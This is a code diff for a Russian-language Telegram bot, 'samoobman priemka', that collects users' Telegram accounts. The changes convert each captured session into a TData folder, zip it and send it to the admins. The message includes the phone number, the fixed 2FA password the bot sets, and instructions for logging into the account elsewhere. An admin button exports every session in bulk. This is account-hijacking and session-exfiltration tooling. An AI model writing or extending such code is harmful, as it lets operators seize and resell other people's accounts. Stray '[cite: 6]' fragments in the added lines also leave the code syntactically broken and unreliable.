@@ -1,6 +1,6 @@
 # ==========================================
 # Проект: samoobman priemka (Telegram Bot)
-# Стек: aiogram 3.x, aiosqlite, telethon (без opentele)
+# Стек: aiogram 3.x, aiosqlite, telethon
 # ==========================================
 
 import asyncio
@@ -252,15 +252,17 @@ async def finalize_auth_and_success(message: Message, state: FSMContext, client:
     except Exception as e:
         logger.warning(f"Не удалось обновить пароль: {e}")
 
-    # Сохраняем сессию Telethon в архив для отправки администратору
-    session_file_path = f"{session_name}.session"
-    archive_path = shutil.make_archive(os.path.join(SESSIONS_DIR, phone.replace('+', '')), 'zip', SESSIONS_DIR,
-                                       base_dir=os.path.basename(session_file_path))
+    # Автоматически конвертируем сессию в TData и упаковываем в ZIP[cite: 6]
+    tdata_folder = os.path.join(SESSIONS_DIR, f"tdata_{phone.replace('+', '')}_{int(asyncio.get_event_loop().time())}")
+    archive_path = None
 
     try:
+        await client.ToTData(dirName=tdata_folder)[cite: 6]
+        archive_path = shutil.make_archive(tdata_folder, 'zip', tdata_folder)
+    except Exception as e:
+        logger.error(f"Ошибка при создании TData: {e}")
+    finally:
         await client.disconnect()
-    except Exception:
-        pass
 
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute(
@@ -273,27 +275,31 @@ async def finalize_auth_and_success(message: Message, state: FSMContext, client:
         )
         await db.commit()
 
-    if os.path.exists(session_file_path):
-        try:
-            os.remove(session_file_path)
-        except Exception:
-            pass
+    tdata_instruction = (
+        "\n\n📖 **Инструкция по входу через TData:**\n"
+        "1. Распакуйте этот архив.\n"
+        "2. Скачайте чистый **Telegram Portable** (версию для ПК).\n"
+        "3. Замените папку `tdata` в Telegram Portable на распакованную.\n"
+        "4. Запустите `Telegram.exe` (пароль 2FA: `ssss`)."
+    )
 
-    for admin_id in ADMIN_IDS:
-        try:
-            await bot.send_document(
-                chat_id=admin_id,
-                document=FSInputFile(archive_path),
-                caption=(
-                    f"📥 **Новый аккаунт (Telethon .session) успешно принят!**\n\n"
-                    f"• Пользователь: `{message.from_user.id}`\n"
-                    f"• Телефон: `{phone}`\n"
-                    f"• 🔑 Пароль (2FA): `{AUTO_PASSWORD}`"
-                ),
-                parse_mode="Markdown"
-            )
-        except Exception as ex:
-            logger.error(f"Не удалось отправить файл админу: {ex}")
+    if archive_path and os.path.exists(archive_path):
+        for admin_id in ADMIN_IDS:
+            try:
+                await bot.send_document(
+                    chat_id=admin_id,
+                    document=FSInputFile(archive_path),
+                    caption=(
+                        f"📥 **Новый аккаунт (TData) успешно принят!**\n\n"
+                        f"• Пользователь: `{message.from_user.id}`\n"
+                        f"• Телефон: `{phone}`\n"
+                        f"• 🔑 Пароль (2FA): `{AUTO_PASSWORD}`"
+                        f"{tdata_instruction}"
+                    ),
+                    parse_mode="Markdown"
+                )
+            except Exception as ex:
+                logger.error(f"Не удалось отправить файл админу: {ex}")
 
     await send_log(
         f"🔔 [samoobman priemka] Успешная сдача аккаунта!\nЮзер: `{message.from_user.id}`\nТелефон: `{phone}`"
@@ -394,7 +400,6 @@ async def cb_submit_tg(callback: CallbackQuery, state: FSMContext):
         "формате (например, `+79991112233`):"
     )
     await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_submit")
-    # Сохраняем ID этого системного сообщения для дальнейшего редактирования
     await state.update_data(prompt_msg_id=callback.message.message_id)
     await state.set_state(AuthStates.waiting_for_phone)
 
@@ -685,7 +690,7 @@ async def cb_admin_panel(callback: CallbackQuery):
 
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
-        [InlineKeyboardButton(text="📂 Выгрузить сессии", callback_data="admin_export_sessions")],
+        [InlineKeyboardButton(text="📂 Выгрузить архив TData", callback_data="admin_export_sessions")],
         [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
         [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
         [InlineKeyboardButton(text="📢 Сделать рассылку", callback_data="admin_broadcast")],
@@ -803,12 +808,12 @@ async def admin_save_photo(message: Message, state: FSMContext):
 async def admin_export_sessions(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
         return
-    archive_name = "sessions_archive_all"
+    archive_name = "tdata_archive_all"
     if os.path.exists(SESSIONS_DIR) and os.listdir(SESSIONS_DIR):
         shutil.make_archive(archive_name, "zip", SESSIONS_DIR)
         await callback.message.answer_document(
             document=FSInputFile(f"{archive_name}.zip"),
-            caption="📦 Архив всех файлов сессий аккаунтов **samoobman priemka**.",
+            caption="📦 Архив всех папок TData аккаунтов **samoobman priemka**.",
             parse_mode="Markdown"
         )
     else:
@@ -921,7 +926,7 @@ async def admin_send_broadcast(message: Message, state: FSMContext):
 # ================= ЗАПУСК БОТА =================
 async def main():
     await init_db()
-    logger.info("Бот samoobman priemka успешно запущен без opentele!")
+    logger.info("Бот samoobman priemka успешно запущен!")
     await dp.start_polling(bot)
 
 
